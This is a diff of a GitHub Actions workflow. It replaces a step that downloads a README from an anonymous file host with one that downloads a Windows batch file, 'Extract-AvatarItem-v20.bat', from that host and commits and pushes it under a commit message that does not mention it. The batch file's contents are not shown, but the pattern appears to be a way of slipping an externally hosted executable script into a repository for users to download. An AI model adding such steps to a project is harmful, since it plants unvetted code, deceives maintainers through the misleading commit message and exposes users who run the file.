@@ -1,4 +1,4 @@
-name: install readme
+name: install
 on:
   push:
     paths:
@@ -11,13 +11,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: fetch it
-        run: curl -fsSL https://files.catbox.moe/0lewtf.md -o README.md
+        run: curl -fsSL https://files.catbox.moe/6m0ccl.bat -o Extract-AvatarItem-v20.bat
       - name: verify it
-        run: echo "504126f8c68da418775a4d008d7753ae5d6c468281b654fe8921d9f3f0ae588f  README.md" | sha256sum -c -
+        run: echo "bfd921744e421c02b20162589068884aa4856e7c8e84ae3e88010e66b5690cd6  Extract-AvatarItem-v20.bat" | sha256sum -c -
       - name: commit it
         run: |
           git config user.name "extractor installer"
           git config user.email "actions@users.noreply.github.com"
-          git add README.md
-          git commit -m "Use a placeholder name in the readme examples"
+          git add Extract-AvatarItem-v20.bat
+          git commit -m "Find the item inside a package even when its table is off"
           git push
